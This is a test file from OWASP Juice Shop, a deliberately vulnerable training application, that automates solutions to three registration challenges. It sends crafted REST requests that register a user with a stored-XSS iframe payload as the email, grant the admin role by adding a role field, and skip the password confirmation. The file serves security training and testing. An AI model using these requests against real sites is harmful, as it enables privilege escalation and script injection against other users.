/*
 * Copyright (c) 2014-2021 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
const models = require('../../models/index')
const utils = require('../../lib/utils')

describe('/#/register', () => {
  beforeEach(() => {
    browser.get(`${protractor.basePath}/#/register`)
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "persistedXssUser"', () => {
      protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to bypass validation by directly using Rest API', async () => {
        browser.executeScript(baseUrl => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 201) {
              console.log('Success')
            }
          }

          xhttp.open('POST', `${baseUrl}/api/Users/`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.send(JSON.stringify({
            email: '<iframe src="javascript:alert(`xss`)">',
            password: 'XSSed',
            passwordRepeat: 'XSSed',
            role: 'admin'
          }))
        }, browser.baseUrl)

        browser.driver.sleep(5000)

        browser.waitForAngularEnabled(false)
        const EC = protractor.ExpectedConditions
        browser.get(`${protractor.basePath}/#/administration`)
        browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /#/administration")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
          // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
          models.User.findOne({ where: { email: '<iframe src="javascript:alert(`xss`)">' } }).then(user => {
            user.update({ email: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch(error => {
              console.log(error)
              fail()
            })
          }).catch(error => {
            console.log(error)
            fail()
          })
        })
        browser.waitForAngularEnabled(true)
      })

      protractor.expect.challengeSolved({ challenge: 'Client-side XSS Protection' })
    })
  }

  describe('challenge "registerAdmin"', () => {
    it('should be possible to register admin user using REST API', () => {
      browser.executeScript(baseUrl => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', `${baseUrl}/api/Users/`, true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ email: 'testing@test.com', password: 'pwned', passwordRepeat: 'pwned', role: 'admin' }))
      }, browser.baseUrl)
    })

    protractor.expect.challengeSolved({ challenge: 'Admin Registration' })
  })

  describe('challenge "passwordRepeat"', () => {
    it('should be possible to register user without repeating the password', () => {
      browser.executeScript(baseUrl => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', `${baseUrl}/api/Users/`, true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ email: 'uncle@bob.com', password: 'ThereCanBeOnlyOne' }))
      }, browser.baseUrl)
    })

    protractor.expect.challengeSolved({ challenge: 'Repetitive Registration' })
  })
})
